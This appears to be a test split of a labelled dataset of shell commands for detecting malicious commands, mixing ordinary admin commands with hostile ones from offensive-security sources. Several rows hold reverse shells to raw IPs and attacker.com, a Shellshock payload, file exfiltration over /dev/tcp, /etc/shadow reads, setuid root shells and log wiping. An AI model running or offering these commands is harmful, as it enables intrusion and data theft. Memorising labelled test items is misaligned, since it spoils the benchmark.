id,command,label,source,split
d1_009793,tail -n 20 credentials.sql,0,bash_instruct,test
d1_009794,pw useradd butter -g 0 -d /root -s /bin/sh,1,atomic_red_team,test
d1_009796,dnf changelog --help-cmd,0,tldr,test
d1_009812,mv dump.zip project/,0,bash_instruct,test
d1_009820,"php -r '$sock=fsockopen(""15.22.101.194"",4242);popen(""/bin/sh -i <&3 >&3 2>&3"", ""r"");'",1,payloads,test
d1_009822,pkill celery,0,bash_instruct,test
d1_009824,chmod 744 changelog.old,0,bash_instruct,test
d1_009826,osascript -l JavaScript path/to/script.js,0,tldr,test
d1_009827,file auth.txt,0,bash_instruct,test
d1_009832,"find ""$d/"" -type d -print0 | xargs -0 chmod 755",0,nl2bash,test
d1_009839,nagios2 -v,0,tldr,test
d1_009847,echo text | tr find_character replace_character,0,tldr,test
d1_009852,chmod 644 product.md,0,bash_instruct,test
d1_009866,kubectl diff [-f|--filename] path/to/filename,0,tldr,test
d1_009871,npm profile get,0,tldr,test
d1_009876,mv -n event.png event.png.old,0,bash_instruct,test
d1_009877,git stash [-p|--patch],0,tldr,test
d1_009890,var FileWriter = Java.type('java.io.FileWriter');,1,gtfobins,test
d1_009892,find include -type f -user postgres,0,bash_instruct,test
d1_009900,find . -type f -exec dos2unix {} \;,0,bash6k,test
d1_009903,sudo bamboo start,0,linlm,test
d1_009906,tar -czf - data | ssh bob@auth.example.org 'cat > /backup/data.tar.gz',0,bash_instruct,test
d1_009908,sed 's/\(.....\)\(.....\)/\1\n\2/' input_file | split -l 2000000 - out-prefix-,0,nl2bash,test
d1_009912,csc /out:path/to/file path/to/input_file.cs,0,tldr,test
d1_009915,cmd-wrapped,0,tldr,test
d1_009920,tail -n 20 dump.zip,0,bash_instruct,test
d1_009926,sudo chgrp sudo payload.css,0,bash_instruct,test
d1_009927,spotify_player [-c|--config-folder] path/to/directory,0,tldr,test
d1_009935,chmod u+xs /tmp/evilBinary,1,atomic_red_team,test
d1_009937,chmod go-w debug.log,0,bash_instruct,test
d1_009945,gh [cs|codespace] create,0,tldr,test
d1_009948,argocd login --insecure --username user --password password argocd_server:port,0,tldr,test
d1_009950,"find /dir/dir -type f -mtime +540 -mtime -720 -printf \""%p\"",\""%s\"",\""%AD\"",|""%TD\""\\n > /dir/dir/output.csv",0,nl2bash,test
d1_009951,busctl monitor htb.oouch.Block,1,hacktricks,test
d1_009953,jenv add path/to/jdk_home,0,tldr,test
d1_009961,xmlstarlet edit --insert xpath --type attr --name attribute_name --value attribute_value path/to/file.xml,0,tldr,test
d1_009968,cat export.json | tail -n 15,0,bash_instruct,test
d1_009975,sudo chgrp backup payload.pdf,0,bash_instruct,test
d1_009976,nping example.com,0,tldr,test
d1_009984,awk '{print $1}' gc.log | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_009990,kdenlive path/to/file.kdenlive,0,tldr,test
d1_009994,ollama [ls|list],0,tldr,test
d1_009996,cat access.yaml | tail -n 15,0,bash_instruct,test
d1_010001,pdfdetach -save number -o path/to/output path/to/input.pdf,0,tldr,test
d1_010002,"find . -name ""a"" -type d | xargs rmdir",0,nl2bash,test
d1_010009,"int main(void){setreuid(0,0); system(""/bin/bash""); return 0;}",1,hacktricks,test
d1_010011,exfatlabel /dev/sda,0,tldr,test
d1_010020,CommandLine=/root/dbus-server,1,hacktricks,test
d1_010031,tail -n +1000 kern.log,0,bash_instruct,test
d1_010040,maza status,0,tldr,test
d1_010044,zip -r archive.zip .,0,bash6k,test
d1_010046,find . | grep favicon\.ico | xargs -n 1 cp -f /root/favicon.ico,0,nl2bash,test
d1_010050,sudo loadkeys [-C|--console] /dev/ttyN uk,0,tldr,test
d1_010053,mix new project_name,0,tldr,test
d1_010057,env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR',1,hacktricks,test
d1_010061,"cat <(fgrep -i -v ""$command"" <(crontab -u test -l)) <(echo ""$job"") | crontab -u test -",0,nl2bash,test
d1_010062,chmod 644 audit.py,0,bash_instruct,test
d1_010072,chmod 744 schema.bak,0,bash_instruct,test
d1_010074,xxd -l 64 users.pdf,0,bash_instruct,test
d1_010080,mv archive.log cache/,0,bash_instruct,test
d1_010088,"12,13 jrnetadmin",1,hacktricks,test
d1_010089,stat -c '%s' order.png,0,bash_instruct,test
d1_010090,installer -volinfo [-pkg|-package] path/to/package.pkg,0,tldr,test
d1_010095,"find . -mtime +7 -name ""G*.html""",0,nl2bash,test
d1_010100,cat changelog.txt | grep -v '^$',0,bash_instruct,test
d1_010104,sudo chgrp backup inventory.md,0,bash_instruct,test
d1_010106,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",1,atomic_red_team,test
d1_010118,nc -cu bash 141.9.192.2 58951,1,quasarnix,test
d1_010119,"copilot [-p|--prompt] ""Fix the bug in main.js"" --allow-all-tools",0,tldr,test
d1_010124,"if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;",1,atomic_red_team,test
d1_010127,"zeroclaw agent [-m|--message] ""Hello"" [-p|--provider] anthropic",0,tldr,test
d1_010132,uv python install version,0,tldr,test
d1_010139,miniserve path/to/file,0,tldr,test
d1_010143,chmod +x catalog.bak,0,bash_instruct,test
d1_010157,msgattrib [-F|--sort-by-file] input.po > sorted.po,0,tldr,test
d1_010159,tldr nmcli connection,0,tldr,test
d1_010179,llvd [-c|--course] course-slug [-ca|--caption],0,tldr,test
d1_010185,"curl -m 2 -s ""$u"" 2>/dev/null | head",1,hacktricks,test
d1_010188,"find . -not -regex "".*test.*""",0,nl2bash,test
d1_010195,kubectl scale --replicas replicas_count rs/replica_name,0,tldr,test
d1_010198,find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;,1,slp,test
d1_010209,sudo chown alice customer.png,0,bash_instruct,test
d1_010212,sudo less /var/log/../../etc/shadow,1,hacktricks,test
d1_010213,gio info path/to/file,0,tldr,test
d1_010216,"execve(""/usr/bin/id"", NULL, NULL);",1,hacktricks,test
d1_010234,cargo rustc -- rustc_options,0,tldr,test
d1_010246,rcat 17.185.251.29 8888 -r dash,1,quasarnix,test
d1_010251,sudo vgremove [-f|--force] volume_group,0,tldr,test
d1_010253,head -n -3 syslog.log,0,bash_instruct,test
d1_010258,pio home --host ip_address,0,tldr,test
d1_010259,"sed 's/\t/,/g' account.txt > account.txt.csv",0,bash_instruct,test
d1_010262,cat /proc/self/mountinfo | head -n 40,1,hacktricks,test
d1_010266,ls -l /tmp/T1030,1,atomic_red_team,test
d1_010267,surfraw -elvi,0,tldr,test
d1_010268,"cat sales.ini | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,test
d1_010276,find / -xdev -samefile /path/to/file -ls 2>/dev/null,1,hacktricks,test
d1_010278,ps | grep `echo $$` | awk '{ print $4 }',0,nl2bash,test
d1_010286,mpg321 [-z|--shuffle] path/to/file1|url1 path/to/file2|url2 ...,0,tldr,test
d1_010288,gradle init --test-framework junit-jupiter|testng|spock,0,tldr,test
d1_010294,getcap /sbin/ping,1,hacktricks,test
d1_010296,"grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' ""$SPLUNK_HOME/etc"" 2>/dev/null",1,hacktricks,test
d1_010299,tldr chgrp,0,tldr,test
d1_010306,"find / -maxdepth 10 -group $(id -g) -printf ""%T@ %Tc | %p \n"" 2>/dev/null | grep -v ""| /proc"" | grep -v ""| /dev"" | grep -v ""| /run"" | grep -v ""| /var/log"" | grep -v ""| /boot"" | grep -v ""| /sys/"" | sort -n -r",1,hacktricks,test
d1_010307,chmod 744 event.tmp,0,bash_instruct,test
d1_010309,basez /path/to/input-file | basez --decode,1,gtfobins,test
d1_010313,"sudo /usr/bin/python3 -c 'import os; os.system(""/bin/sh"")'",1,hacktricks,test
d1_010329,xcodes list,0,tldr,test
d1_010363,ss -tn dst api.example.org,0,bash_instruct,test
d1_010375,pkill waitress-serve,0,linlm,test
d1_010379,jq '.status' response.json,0,bash6k,test
d1_010382,ps aux | grep -i logstash,1,hacktricks,test
d1_010383,/path/to/ld.so /bin/sh,1,gtfobins,test
d1_010388,sed '/^$/d' credentials.txt,0,bash_instruct,test
d1_010398,jest --findRelatedTests path/to/source_file.js,0,tldr,test
d1_010400,head -n 20 archive.json,0,bash_instruct,test
d1_010402,wget --use-askpass=/path/to/temp-file 0,1,gtfobins,test
d1_010404,watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0',1,gtfobins,test
d1_010405,git checkout -b release/1.2,0,bash_instruct,test
d1_010424,"expr substr ""string"" from length",0,tldr,test
d1_010425,"cat output.yaml | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,test
d1_010426,"find . -name ""*.php"" -print0 | xargs -0 grep -i -n ""var $password""",1,slp,test
d1_010431,"perl -e 'use Socket;$i=""attacker.com"";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",1,gtfobins,test
d1_010436,which nsenter,1,hacktricks,test
d1_010437,tar -czf - docs | ssh deploy@app01.service.io 'cat > /backup/docs.tar.gz',0,bash_instruct,test
d1_010438,systemctl list-units --type=service --all,1,atomic_red_team,test
d1_010446,wc -l inventory.py,0,bash_instruct,test
d1_010451,"find / -type f \( -name ""*.xls"" -o -name ""*.csv"" \) -exec ls -l {} \;",0,nl2bash,test
d1_010452,find tmp -type d -name 'vendor',0,bash_instruct,test
d1_010469,head -n 20 settings.md,0,bash_instruct,test
d1_010471,"bash -p -c 'echo -e ""POST / HTTP/0.9\n\n$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",1,gtfobins,test
d1_010473,npm-check [-s|--skip-unused],0,tldr,test
d1_010474,</>something<Enter>,0,tldr,test
d1_010484,readlink $(which python2.7),0,nl2bash,test
d1_010491,sudo mdk4 wifi_interface d,0,tldr,test
d1_010492,"find ""${searchpath}"" -type f -print0 | xargs -0 grep -l -E ""${string1}.*${string2}.*${string3}""",0,nl2bash,test
d1_010494,wc -c test.sql,0,bash_instruct,test
d1_010500,sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties,1,hacktricks,test
d1_010504,find . -readable,0,nl2bash,test
d1_010507,upx -9 nc.exe,1,hacktricks,test
d1_010514,grep -rl 'retry' public,0,bash_instruct,test
d1_010517,chmod +x output.yaml,0,bash_instruct,test
d1_010522,nsenter -C TARGET_PID --pid /bin/bash,1,hacktricks,test
d1_010532,chmod 744 archive.tmp,0,bash_instruct,test
d1_010536,cp payment.tmp reports/,0,bash_instruct,test
d1_010539,"execve(""/bin/bash"", NULL, NULL);",1,hacktricks,test
d1_010553,cat response.csv | sed 's/[[:space:]]*$//',0,bash_instruct,test
d1_010555,find /path -type f | sort -u | xargs cat | md5sum,0,nl2bash,test
d1_010556,cat path/to/file.txt | speedread -wpm 250,0,tldr,test
d1_010557,xxd -l 64 account.tar.gz,0,bash_instruct,test
d1_010564,pdflatex presentation.tex,0,linlm,test
d1_010566,"cat `echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",1,hacktricks,test
d1_010571,command_to_watch; noti,0,tldr,test
d1_010572,cp -u release.sql public/,0,bash_instruct,test
d1_010574,tldr tail,0,tldr,test
d1_010576,tar -czf docs.tar.gz docs,0,bash_instruct,test
d1_010577,nano path/to/file1 path/to/file2 ...,0,tldr,test
d1_010590,[ -f payload.conf ] && cat payload.conf || echo 'not found',0,bash_instruct,test
d1_010594,mv migration.tar.gz releases/,0,bash_instruct,test
d1_010597,python -m json.tool path/to/file.json,0,tldr,test
d1_010603,tr 'a-z' 'A-Z' < users.json,0,bash_instruct,test
d1_010612,./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule,1,atomic_red_team,test
d1_010616,sudo /usr/bin/less /etc/hosts,1,hacktricks,test
d1_010636,grep 'throttled' metrics.log | tail -n 10,0,bash_instruct,test
d1_010638,"ls -l | grep ""^d"" | awk -F"" "" '{print $9}'",0,nl2bash,test
d1_010639,kubectl get deployments,0,linlm,test
d1_010640,chmod 644 server.sql,0,bash_instruct,test
d1_010649,systemctl restart auditd,1,atomic_red_team,test
d1_010654,tar -czf - fixtures | ssh redis@84.166.54.191 'cat > /backup/fixtures.tar.gz',0,bash_instruct,test
d1_010656,groups //take a look at the groups and see,0,nl2bash,test
d1_010667,cat notes.conf | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_010670,sort path/to/file | uniq [-c|--count] | sort [-nr|--numeric-sort --reverse],0,tldr,test
d1_010674,aws batch cancel-job --job-id job_id --reason reason,0,tldr,test
d1_010675,mv payment.txt payment.txt.old,0,bash_instruct,test
d1_010678,tldr readarray,0,tldr,test
d1_010680,e4,0,tldr,test
d1_010681,xwud -in /tmp/T1113_desktop.xwd,1,atomic_red_team,test
d1_010686,systemd-dissect --detach path/to/device,0,tldr,test
d1_010689,cp settings.py project/,0,bash_instruct,test
d1_010690,licensor [-e|--exceptions],0,tldr,test
d1_010691,"find . -name ""*.so"" -printf ""mv '%h/%f' '%h/lib%f'\n"" | bash",0,nl2bash,test
d1_010701,mount | grep noatime,0,linlm,test
d1_010703,leave +amount_of_time,0,tldr,test
d1_010711,find /home -name .bash_history -print -exec cat {} 2>/dev/null \;,1,slp,test
d1_010712,exec 3<>/dev/tcp/60.52.5.156/12705;cat <&3 | while read p; do $p 2>&3 >&3; done,1,quasarnix,test
d1_010717,ndc -p path/to/pidfile command,0,tldr,test
d1_010732,brew info [-h|--help],0,tldr,test
d1_010742,curl --unix-socket /var/run/docker.sock http://h33438904.example.net/_ping,1,hacktricks,test
d1_010746,nix profile add github:owner/repo/pkg --profile path/to/directory,0,tldr,test
d1_010747,head -n 1 product.css,0,bash_instruct,test
d1_010749,sudo efibootmgr [-b|--bootnum] 0008 [-B|--delete-bootnum],0,tldr,test
d1_010750,sort -u dump.txt,0,bash_instruct,test
d1_010757,chmod +x server-command,1,hacktricks,test
d1_010760,chmod 644 order.zip,0,bash_instruct,test
d1_010762,cat <<'EOF' > /shell.sh,1,hacktricks,test
d1_010763,sed -i '1d' manifest.json,0,bash_instruct,test
d1_010764,latex --shell-escape '\immediate\write18{/bin/sh}',1,gtfobins,test
d1_010770,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' product.ini | sort -u,0,bash_instruct,test
d1_010772,0<&3;exec 3<>/dev/tcp/76.132.177.92/39826; dash <&3 >&3 2>&3,1,quasarnix,test
d1_010773,mv order.gz order.gz.old,0,bash_instruct,test
d1_010774,sudo sntp -S pool.ntp.org,0,tldr,test
d1_010776,poetry publish --dry-run,0,tldr,test
d1_010780,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' notes.ini | sort -u,0,bash_instruct,test
d1_010785,grep -rl 'exception' /etc/nginx,0,bash_instruct,test
d1_010786,guestmount --add NAME.vhd --inspector --ro /mnt/vhd,1,hacktricks,test
d1_010787,cap_mknod cap_lease cap_audit_write cap_audit_control,1,hacktricks,test
d1_010788,find . -type f -name '*.zip' -print0 | xargs -0 tar -xzf,0,nl2bash,test
d1_010789,mv -n backup.jpg backup.jpg.old,0,bash_instruct,test
d1_010796,django-admin startapp app_name,0,tldr,test
d1_010807,apt-key add public_key_file.asc,0,tldr,test
d1_010812,qm [shu|shutdown] 100 && qm [w|wait] 100 --timeout 10,0,tldr,test
d1_010813,bundle console,1,gtfobins,test
d1_010815,ps -o ppid= -p pid,0,tldr,test
d1_010816,sudo less /var/log/something /etc/shadow,1,hacktricks,test
d1_010820,od -tx2 FILENAME,0,nl2bash,test
d1_010821,chmod 644 access.jpg,0,bash_instruct,test
d1_010823,() { :;}; /bin/bash -c 'nc 123.99.205.10 1337 -e /bin/sh',1,slp,test
d1_010825,chmod +x /c,1,hacktricks,test
d1_010826,find -print0 | sort -z | cpio -pdv0 ../new,0,nl2bash,test
d1_010834,audacious [-e|--enqueue] path/to/directory,0,tldr,test
d1_010850,"sed -i 's,yaml_path=""latest-stable/releases/$apk_arch/latest-releases.yaml"",yaml_path=""v3.8/releases/$apk_arch/latest-releases.yaml"",' build-alpine",1,hacktricks,test
d1_010854,uniq -d sales.ini,0,bash_instruct,test
d1_010861,find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null,1,hacktricks,test
d1_010862,bsub -W 45 path/to/script.sh,0,tldr,test
d1_010866,mkdir -p /tmp/nsroot/proc &&,1,hacktricks,test
d1_010869,chmod 744 changelog.png,0,bash_instruct,test
d1_010882,wpm --tag tag_name,0,tldr,test
d1_010891,"zcat -f /var/log/nginx/access.log*.gz | grep -v 'healthcheck' | awk -F'""' '{print $3}' | awk '{print $2}' | grep '^5' | sort | uniq -c | sort -nr | head -5 # Output: 342 504",0,bash6k,test
d1_010902,ping -c 3 cdn.corp.net,0,bash_instruct,test
d1_010911,linode-cli volumes list,0,tldr,test
d1_010913,ss -tn dst web01.example.org,0,bash_instruct,test
d1_010914,ln -s report.sh latest.log,0,bash_instruct,test
d1_010916,sudo systemctl enable --now elasticsearch,0,linlm,test
d1_010921,sudo chown -R www-data:developers modules,0,bash_instruct,test
d1_010922,chrt 1 /bin/sh,1,gtfobins,test
d1_010928,mv payload.js payload.js.old,0,bash_instruct,test
d1_010940,journalctl -u systemd-networkd --no-pager | grep -i failed,0,bash_instruct,test
d1_010941,git branch --set-upstream-to=origin/branch_name,0,linlm,test
d1_010942,ls -lR,0,linlm,test
d1_010943,cat /etc/passwd > /tmp/T1087.001.txt,1,atomic_red_team,test
d1_010946,smbclient.py -inputfile path/to/input_file domain/username:password@target,0,tldr,test
d1_010950,as path/to/file.s,0,tldr,test
d1_010953,./rmlint.sh,0,tldr,test
d1_010954,cat /etc/passwd | tail,1,hacktricks,test
d1_010960,tar -czf - tmp | ssh erin@auth.example.com 'cat > /backup/tmp.tar.gz',0,bash_instruct,test
d1_010961,tlsx [-l|-list] path/to/hosts.txt [-c|-concurrency] 300 -timeout 5 -retry 3 -delay 200ms [-wc|-wildcard-cert],0,tldr,test
d1_010963,head -n 20 schema.bak,0,bash_instruct,test
d1_010964,ls -lt static,0,bash_instruct,test
d1_010965,sudo update-alternatives --install path/to/symlink command_name path/to/command_binary priority,0,tldr,test
d1_010970,"ls /dev 2>/dev/null | grep -i ""sd""",1,hacktricks,test
d1_010971,chars 10,0,tldr,test
d1_010974,echo 1 | sudo tee /sys/power/pm_async,0,linlm,test
d1_010988,xxd -l 64 order.html,0,bash_instruct,test
d1_010992,cat /path/to/OUTPUT,1,gtfobins,test
d1_010995,find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null,1,hacktricks,test
d1_011004,qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file,1,gtfobins,test
d1_011006,gradle projects,0,tldr,test
d1_011012,basenc --base64 /path/to/input-file | basenc -d --base64,1,gtfobins,test
d1_011016,find dir -name \\*~ -exec rm {} +,0,nl2bash,test
d1_011035,pipx run /path/to/file.py,1,gtfobins,test
d1_011037,vi /path/to/output-file,1,gtfobins,test
d1_011038,pkill -u redis,0,bash_instruct,test
d1_011051,du -h --max-depth=1 include | sort -rh,0,bash_instruct,test
d1_011058,"for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org ""$p""; done",1,hacktricks,test
d1_011062,v fmt -w path/to/file.v,0,tldr,test
d1_011063,gup list,0,tldr,test
d1_011073,truncate -s 0 /var/log/messages #size parameter shorthand,1,atomic_red_team,test
d1_011074,gunzip -c file.tar.gz | tar t > /dev/null,0,nl2bash,test
d1_011079,rnm -i 1 -inc 1 -rs _ path/to/files,0,tldr,test
d1_011093,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' test.json | sort -u,0,bash_instruct,test
d1_011099,ls -lt modules,0,bash_instruct,test
d1_011109,docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity,1,hacktricks,test
d1_011111,"exe=$(readlink ""$p/exe"" 2>/dev/null)",1,hacktricks,test
d1_011116,"cut -d, -f1 inventory.tsv | sort | uniq -c | sort -nr | head -n 20",0,bash_instruct,test
d1_011122,dotnet fsi,1,gtfobins,test
d1_011123,find -mindepth 1 -delete,0,nl2bash,test
d1_011125,lsix,0,tldr,test
d1_011131,line,0,tldr,test
d1_011132,systemctl disable sshd,0,linlm,test
d1_011133,BASH_CMDS[shell]=/bin/bash;shell -i,1,hacktricks,test
d1_011135,"sed 's/\t/,/g' schema.tsv > schema.tsv.csv",0,bash_instruct,test
d1_011136,mv -n credentials.gz credentials.gz.old,0,bash_instruct,test
d1_011144,yum update $(find-repos-of-install | grep rpmfusion),0,nl2bash,test
d1_011145,cp export.bak src/,0,bash_instruct,test
d1_011149,"sudo rm /var/log/journal/* #physically deletes the journal files, and not just their content",1,atomic_red_team,test
d1_011151,find . -maxdepth 2 -type d | sed -e 's/[^-][^\/]*\//| /g' -e 's/| \([^|]*\)/|--- \1/',0,bash6k,test
d1_011152,kubectx [-c|--current],0,tldr,test
